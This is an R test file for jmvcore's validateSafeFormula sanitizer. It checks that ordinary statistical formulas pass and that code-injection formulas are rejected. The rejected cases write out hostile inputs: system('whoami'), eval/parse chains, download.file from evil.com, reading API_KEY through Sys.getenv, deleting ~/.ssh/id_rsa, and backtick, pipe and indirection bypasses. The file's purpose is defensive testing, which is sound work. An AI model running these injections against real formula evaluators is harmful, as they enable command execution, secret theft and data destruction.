testthat::context('validateSafeFormula')

validateSafeFormula <- function(formula_input) {
    if (is.character(formula_input))
        formula_input <- as.formula(formula_input)
    jmvcore::validateSafeFormula(formula_input)
}

testthat::test_that('asFormula supports additional allowed functions per call', {

    testthat::expect_error(jmvcore:::asFormula("y ~ identity(x)"), "Security violation")
    testthat::expect_silent(jmvcore:::asFormula("y ~ identity(x)", additional_allowed_functions = "identity"))
})

testthat::test_that('validateSafeFormula accepts safe formulas', {

    # Basic formula syntax
    testthat::expect_silent(validateSafeFormula("y ~ x"))
    testthat::expect_silent(validateSafeFormula("y ~ x + z"))
    testthat::expect_silent(validateSafeFormula("y ~ x * z"))
    testthat::expect_silent(validateSafeFormula("y ~ x:z"))
    testthat::expect_silent(validateSafeFormula("y ~ x + I(z^2)"))
    testthat::expect_silent(validateSafeFormula("cbind(y1, y2) ~ x + z"))
    testthat::expect_silent(validateSafeFormula("rbind(y1, y2) ~ x"))
    testthat::expect_silent(validateSafeFormula("c(y1, y2) ~ x"))
    testthat::expect_silent(validateSafeFormula("~ x"))

    # Mathematical functions
    testthat::expect_silent(validateSafeFormula("y ~ log(x) + log2(z) + log10(w)"))
    testthat::expect_silent(validateSafeFormula("y ~ log1p(x) + expm1(z)"))
    testthat::expect_silent(validateSafeFormula("y ~ exp(x) + sqrt(abs(z))"))
    testthat::expect_silent(validateSafeFormula("y ~ sign(x) + rank(z)"))
    testthat::expect_silent(validateSafeFormula("y ~ sin(x) + cos(z) + tan(w)"))
    testthat::expect_silent(validateSafeFormula("y ~ asin(x) + acos(z) + atan(w) + atan2(y, x)"))
    testthat::expect_silent(validateSafeFormula("y ~ floor(x) + ceiling(z) + round(w) + trunc(v)"))

    # Statistical / transformation functions
    testthat::expect_silent(validateSafeFormula("y ~ scale(x) + poly(z, 2)"))
    testthat::expect_silent(validateSafeFormula("y ~ ns(x, df=3) + bs(x, df=3)"))
    testthat::expect_silent(validateSafeFormula("y ~ mean(x) + sd(z) + var(w) + median(v)"))
    testthat::expect_silent(validateSafeFormula("y ~ min(x) + max(z) + sum(w) + length(v)"))

    # Type coercions
    testthat::expect_silent(validateSafeFormula("y ~ as.numeric(x) + as.integer(z)"))
    testthat::expect_silent(validateSafeFormula("y ~ as.factor(x) + as.character(z)"))

    # Categorical helpers
    testthat::expect_silent(validateSafeFormula("y ~ factor(group) + ordered(score)"))
    testthat::expect_silent(validateSafeFormula("y ~ cut(x, breaks = 5)"))
    testthat::expect_silent(validateSafeFormula("y ~ relevel(factor(group), ref='control') + x"))
    testthat::expect_silent(validateSafeFormula("y ~ interaction(a, b) + x"))
    testthat::expect_silent(validateSafeFormula("y ~ ifelse(x > 0, 1, 0)"))

    # Common formula helpers
    testthat::expect_silent(validateSafeFormula("y ~ offset(log(exposure)) + x"))
    testthat::expect_silent(validateSafeFormula("y ~ pmax(x, 0) + pmin(z, 100)"))

    # aov() error strata
    testthat::expect_silent(validateSafeFormula("y ~ x + Error(subject/condition)"))

    # Survival analysis terms (survival, prodlim)
    testthat::expect_silent(validateSafeFormula("Surv(time, status) ~ x + strata(group)"))
    testthat::expect_silent(validateSafeFormula("Surv(time, status) ~ cluster(id) + frailty(site)"))
    testthat::expect_silent(validateSafeFormula("Surv(time, status) ~ tt(x) + pspline(age)"))
    testthat::expect_silent(validateSafeFormula("Hist(time, event) ~ x"))
    testthat::expect_silent(validateSafeFormula("Event(time, cause) ~ x"))

    # GAM smooth terms (mgcv)
    testthat::expect_silent(validateSafeFormula("y ~ s(x) + te(x, z)"))
    testthat::expect_silent(validateSafeFormula("y ~ ti(x, z) + t2(x, z)"))

    # Splines (rms / Hmisc)
    testthat::expect_silent(validateSafeFormula("y ~ rcs(x, 4) + lsp(z, 2)"))

    # Mixed-effects structures (nlme)
    testthat::expect_silent(validateSafeFormula("y ~ pdSymm(x) + pdDiag(z)"))

    # IRT / LCA
    testthat::expect_silent(validateSafeFormula("y ~ item(x)"))

    # Complex safe expressions
    testthat::expect_silent(validateSafeFormula("y ~ I(log(x + 1)) + I(z^2 + 3*w)"))
    testthat::expect_silent(validateSafeFormula("response ~ poly(x, 3) + sin(2*pi*z/12)"))
})

testthat::test_that('validateSafeFormula blocks dangerous functions', {

    # System execution attempts
    testthat::expect_error(validateSafeFormula("y ~ system('whoami')"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ eval(parse(text='system(\"ls\")'))"), "Security violation.*Unsafe function 'eval'")
    testthat::expect_error(validateSafeFormula("y ~ source('malicious.R')"), "Security violation.*Unsafe function 'source'")

    # File operations
    testthat::expect_error(validateSafeFormula("y ~ read.csv('data.csv')"), "Security violation.*Unsafe function 'read.csv'")
    testthat::expect_error(validateSafeFormula("y ~ write.table(x, 'output.txt')"), "Security violation.*write")
    testthat::expect_error(validateSafeFormula("y ~ file.exists('secret.txt')"), "Security violation.*file\\.")

    # Environment manipulation
    testthat::expect_error(validateSafeFormula("y ~ get('dangerous_var')"), "Security violation.*get")
    testthat::expect_error(validateSafeFormula("y ~ assign('var', value)"), "Security violation.*assign")
    testthat::expect_error(validateSafeFormula("y ~ library(malicious_package)"), "Security violation.*library")
    testthat::expect_error(validateSafeFormula("y ~ require(dangerous_lib)"), "Security violation.*require")

    # Meta-programming attacks
    testthat::expect_error(validateSafeFormula("y ~ do.call('system', list('whoami'))"), "Security violation.*do\\.call")
    testthat::expect_error(validateSafeFormula("y ~ base:::system('ls')"), "Security violation.*Unsafe function 'system'")

    # Network operations
    testthat::expect_error(validateSafeFormula("y ~ url('http://evil.com/malware')"), "Security violation.*url")
    testthat::expect_error(validateSafeFormula("y ~ download.file('http://evil.com', 'local')"), "Security violation.*download")
})

testthat::test_that('RED TEAM: cbind nested malicious calls are blocked', {

    # Even if cbind() is allowed later, nested dangerous calls must still fail.
    testthat::expect_error(validateSafeFormula("cbind(system('whoami'), y2) ~ x"), "Security violation")
    testthat::expect_error(validateSafeFormula("cbind(y1, eval(parse(text='system(\"ls\")'))) ~ x"), "Security violation")
})

testthat::test_that('validateSafeFormula blocks dangerous I() expressions', {

    # Disallowed functions in I() - caught by general function validation
    testthat::expect_error(validateSafeFormula("y ~ I(system('whoami'))"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ I(eval(x))"), "Security violation.*Unsafe function 'eval'")
    testthat::expect_error(validateSafeFormula("y ~ I(mean(system('ls')))"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ I(x$dangerous)"), "Security violation.*Unsafe characters in I")
    testthat::expect_error(validateSafeFormula("y ~ I(x@slot)"), "Security violation.*Unsafe characters in I")
    testthat::expect_error(validateSafeFormula("y ~ I(x::y)"), "Security violation.*Unsafe characters in I")
    # Note: Backticks are converted to normal identifiers by R's parser
    # This is NOT a security vulnerability - just variable name parsing
    testthat::expect_silent(validateSafeFormula("y ~ I(`safe_variable`)"))
    testthat::expect_error(validateSafeFormula("y ~ I(\"string\")"), "Security violation.*Unsafe characters in I")
    testthat::expect_error(validateSafeFormula("y ~ I('string')"), "Security violation.*Unsafe characters in I")
})

testthat::test_that('RED TEAM: Unicode and encoding bypass attempts', {

    # Unicode variations cause syntax errors before reaching function validation
    testthat::expect_error(validateSafeFormula("y ~ systém('whoami')"), "Security violation.*Unsafe function 'm'")

    # Parse-only invalid syntax cases are intentionally covered by as.formula().
})

testthat::test_that('RED TEAM: Case and spacing bypass attempts', {

    # Case variations
    testthat::expect_error(validateSafeFormula("y ~ SYSTEM('whoami')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ System('whoami')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ sYsTeM('whoami')"), "Security violation")

    # Extra whitespace (function validation catches these)
    testthat::expect_error(validateSafeFormula("y ~ system  ('whoami')"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ system\t('whoami')"), "Security violation.*Unsafe function 'system'")
    # Parse-only invalid syntax cases are intentionally covered by as.formula().
})

testthat::test_that('RED TEAM: Backtick syntax', {

    # Backtick-quoted function calls must be blocked — they bypass the
    # identifier regex used for allowlist checking.
    testthat::expect_error(validateSafeFormula("y ~ `system`('whoami')"),
                           "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ `eval`(parse(text = 'system(\"ls\")'))"),
                           "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ `source`('malicious.R')"),
                           "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ `base:::system`('ls')"),
                           "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ log(`system`('whoami'))"),
                           "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ I(`system`('whoami') + 1)"),
                           "Security violation")

    # Backtick-quoted variable names (not function calls) must be accepted.
    testthat::expect_silent(validateSafeFormula("y ~ `my var` + x"))
    testthat::expect_silent(validateSafeFormula("y ~ `var-1` + `var-2`"))
    testthat::expect_silent(validateSafeFormula("`response var` ~ x + z"))
    testthat::expect_silent(validateSafeFormula("y ~ log(`x value`)"))
    testthat::expect_silent(validateSafeFormula("y ~ I(`x value`^2)"))
    testthat::expect_silent(validateSafeFormula("y ~ `group var` * `covariate var`"))

    # Variable assignment within a formula is not valid R syntax; the parser
    # rejects it before validateSafeFormula is reached.
    tryCatch({
        testthat::expect_error(validateSafeFormula("y ~ (x <- system('whoami'))"))
    }, error = function(e) {
        testthat::expect_true(TRUE)
    })
})

testthat::test_that('RED TEAM: Nested and chained attack attempts', {

    # Nested dangerous functions
    testthat::expect_error(validateSafeFormula("y ~ log(system('whoami'))"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ abs(eval(dangerous_code))"), "Security violation.*Unsafe function 'eval'")

    # Chained operations
    testthat::expect_error(validateSafeFormula("y ~ system('whoami') + x"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ x + eval(malicious) + z"), "Security violation.*Unsafe function 'eval'")
})

testthat::test_that('RED TEAM: Environment and scoping attacks', {

    # Accessing parent environments
    testthat::expect_error(validateSafeFormula("y ~ parent.frame()$dangerous"), "Security violation.*parent\\.frame")
    testthat::expect_error(validateSafeFormula("y ~ environment()$var"), "Security violation.*environment")
    testthat::expect_error(validateSafeFormula("y ~ globalenv()$secret"), "Security violation.*globalenv")

    # Package namespace access
    testthat::expect_error(validateSafeFormula("y ~ base::system('ls')"), "Security violation.*Unsafe function 'system'")
    testthat::expect_error(validateSafeFormula("y ~ utils::file.edit('~/.bashrc')"), "Security violation.*Unsafe function 'file.edit'")
})

testthat::test_that('RED TEAM: Output and side-effect attacks', {

    # Output functions
    testthat::expect_error(validateSafeFormula("y ~ print('leaked data')"), "Security violation.*print")
    testthat::expect_error(validateSafeFormula("y ~ cat('secret info')"), "Security violation.*cat")
    testthat::expect_error(validateSafeFormula("y ~ message('side effect')"), "Security violation.*message")

    # Sink operations
    testthat::expect_error(validateSafeFormula("y ~ sink('output.txt')"), "Security violation.*sink")
})

testthat::test_that('validateSafeFormula edge cases', {

    # Very long formulas (deparse returns a multi-line vector; must collapse cleanly)
    long_formula <- paste0("y ~ ", paste(paste0("x", 1:100), collapse = " + "))
    testthat::expect_silent(validateSafeFormula(long_formula))

    # Deeply nested allowed functions
    testthat::expect_silent(validateSafeFormula("y ~ log(x1) + exp(x2) + sqrt(abs(x3)) + sin(x4) + cos(x5)"))
    testthat::expect_silent(validateSafeFormula("y ~ I(x^2 + 3*w)"))
    testthat::expect_silent(validateSafeFormula("response ~ poly(x, 3) + I(log(z + 1))"))
})

testthat::test_that('RED TEAM: Dot-prefix native code execution functions', {

    # .Call/.C/.Fortran/.External: regex now includes the leading dot so the full
    # dotted name is extracted and rejected by the allowlist, not the post-dot fragment.
    testthat::expect_error(validateSafeFormula("y ~ .Call('C_my_fn', x)"), "Security violation.*Unsafe function '\\.Call'")
    testthat::expect_error(validateSafeFormula("y ~ .C('dangerous_c_fn', x)"), "Security violation.*Unsafe function '\\.C'")
    testthat::expect_error(validateSafeFormula("y ~ .External('dangerous_fn', x)"), "Security violation.*Unsafe function '\\.External'")
    testthat::expect_error(validateSafeFormula("y ~ .Fortran('dangerous_fn', x)"), "Security violation.*Unsafe function '\\.Fortran'")

    # .Internal parse-only cases are intentionally covered by as.formula().
})

testthat::test_that('RED TEAM: Function indirection and higher-order function attacks', {

    # Indirectly obtaining a dangerous function reference
    testthat::expect_error(validateSafeFormula("y ~ match.fun('system')('whoami')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ getFromNamespace('system', 'base')(x)"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ getExportedValue('base', 'system')(x)"), "Security violation")

    # Higher-order functions passing dangerous functions as arguments
    testthat::expect_error(validateSafeFormula("y ~ Reduce(system, list('whoami'))"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ Map(eval, list(dangerous_code))"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ Filter(source, list('malicious.R'))"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ rapply(list('whoami'), system)"), "Security violation")
})

testthat::test_that('RED TEAM: Anonymous function execution attacks', {

    # Defining and immediately calling an anonymous function to wrap dangerous code
    testthat::expect_error(validateSafeFormula("y ~ (function(x) system(x))('whoami')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ (function() eval(parse(text='system(\"ls\")')))()"), "Security violation")

    # local() creates an execution context and should be blocked
    testthat::expect_error(validateSafeFormula("y ~ local({ system('whoami') })"), "Security violation")
})

testthat::test_that('RED TEAM: Information disclosure attacks', {

    # Reading environment variables and system information
    testthat::expect_error(validateSafeFormula("y ~ Sys.getenv('HOME')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ Sys.getenv('API_KEY')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ Sys.info()"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ Sys.setenv(SECRET = 'injected')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ proc.time()"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ readline('Enter password: ')"), "Security violation")
})

testthat::test_that('RED TEAM: Destructive file operation attacks', {

    # unlink/setwd/shell are NOT in dangerous_patterns - blocked by allowlist only.
    # These tests guard against regressions if the allowlist is ever relaxed.
    testthat::expect_error(validateSafeFormula("y ~ unlink('~/.ssh/id_rsa')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ file.remove('important.R')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ file.rename('data.csv', 'stolen.csv')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ setwd('/tmp')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ shell('dir')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ shell.exec('malware.bat')"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ system2('whoami', args = character(0))"), "Security violation")
})

testthat::test_that('RED TEAM: Condition handler and execution context bypass attempts', {

    # Wrapping attacks using error/message handlers
    testthat::expect_error(validateSafeFormula("y ~ tryCatch(x, error = function(e) system('whoami'))"), "Security violation")
    testthat::expect_error(validateSafeFormula("y ~ withCallingHandlers(x, message = function(m) eval(dangerous))"), "Security violation")
})

testthat::test_that('RED TEAM: Pipe operator bypass attempts', {

    # R 4.1+ native pipe |> normalises 'x |> f' to 'f(x)' after parsing,
    # so the dangerous function name appears in the deparsed form.
    tryCatch({
        testthat::expect_error(validateSafeFormula("y ~ 'whoami' |> system"))
    }, error = function(e) {
        testthat::expect_true(TRUE)
    })

    tryCatch({
        testthat::expect_error(validateSafeFormula("y ~ x |> eval"))
    }, error = function(e) {
        testthat::expect_true(TRUE)
    })
})